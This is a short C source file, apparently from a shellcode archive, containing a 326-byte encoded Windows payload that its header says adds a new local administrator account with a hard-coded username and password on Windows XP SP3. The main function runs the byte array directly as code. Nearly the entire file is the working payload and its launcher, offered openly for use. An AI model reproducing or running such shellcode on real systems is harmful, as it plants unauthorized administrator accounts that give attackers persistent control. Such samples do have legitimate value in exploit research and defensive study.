/*
Title: generic win32 - add new local administrator 326 bytes
Author: Anastasios Monachos (secuid0) - anastasiosm[at]gmail[dot]com
Method: Dynamic opcode, encoded shellcode
Tested on: WinXP Pro SP3 (EN) 32bit - Build 2600.100427-1636 and Build 2600.080413-2111
Greetz: offsec team, inj3ct0r team, hdm
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

char code[] =
"\xda\xde\xd9\x74\x24\xf4\xb8\x22\xd2\x27\x7a\x29\xc9\xb1\x4b"
"\x5b\x31\x43\x1a\x83\xeb\xfc\x03\x43\x16\xe2\xd7\x3b\xbc\x7a"
"\x17\xbc\x95\x4b\xd7\xd8\x92\xec\xe7\xa5\x65\x94\x08\x2d\x25"
"\x69\x9d\x41\xba\xdc\x2a\xe1\xca\xf7\x25\xe2\xca\x07\xbe\xa2"
"\xfe\x8a\x80\x5e\x74\xd4\x3c\xc1\x49\xb5\xb7\x91\x69\x12\x4c"
"\x2c\x4e\xd1\x06\xaa\xd6\xe4\x4c\x3f\x6c\xff\x1b\x1a\x51\xfe"
"\xf0\x78\xa5\x49\x8d\x4b\x4d\x48\x7f\x82\xae\x7a\xbf\x19\xfc"
"\xf9\xff\x96\xfa\xc0\x30\x5b\x04\x04\x25\x90\x3d\xf6\x9d\x71"
"\x37\xe7\x56\xdb\x93\xe6\x83\xba\x50\xe4\x18\xc8\x3d\xe9\x9f"
"\x25\x4a\x15\x14\xb8\xa5\x9f\x6e\x9f\x29\xc1\xad\x72\x01\x53"
"\xd9\x27\x5d\xac\xe6\xb1\xa5\xd2\xdc\xca\xa9\xd4\xdc\x4b\x6e"
"\xd0\xdc\x4b\x71\xe0\x12\x3e\x97\xd1\x42\xd8\x57\xd6\x92\x43"
"\xa9\x5c\x9c\x0d\x8e\x83\xd3\x70\xc2\x4c\x13\x73\x1b\xc4\xf6"
"\x9b\x43\x29\x07\xa4\xfd\x17\x1c\xb9\xa0\x1a\x9f\x3a\xd4\xd4"
"\xde\x82\xee\x16\xe0\x04\x07\xa0\x1f\xfb\x28\x26\xd1\x5f\xe6"
"\x79\xbd\x0c\xf7\x2f\x39\x82\xc7\x80\xbe\xb1\xcf\xc8\xad\xc5"
"\x2f\xf7\x4e\x57\xb4\x26\xf5\xdf\x51\x17\xda\x7c\xba\x39\x41"
"\xf7\x9a\xb0\xfa\x92\xa8\x1a\x8f\x39\x2e\x2e\x06\xa6\x80\xf0"
"\xb5\x16\x8f\x9b\x65\x78\x2e\x38\x01\xa6\x96\xe6\xe9\xc8\xb3"
"\x92\xc9\x78\x53\x38\x68\xed\xcc\xcc\x05\x98\x62\x11\xb8\x06"
"\xee\x38\x54\xae\x83\xce\xda\x51\x10\x40\x68\xe1\xf8\xed\xe9"
"\x66\x8c\x78\x95\x58\x4e\x54\x34\xfd\xea\xaa";

int main(int argc, char **argv)
{
	((void (*)())code)();
	printf("New local admin \tUsername: secuid0\n\t\t\tPassword: m0nk");
	return 0;
}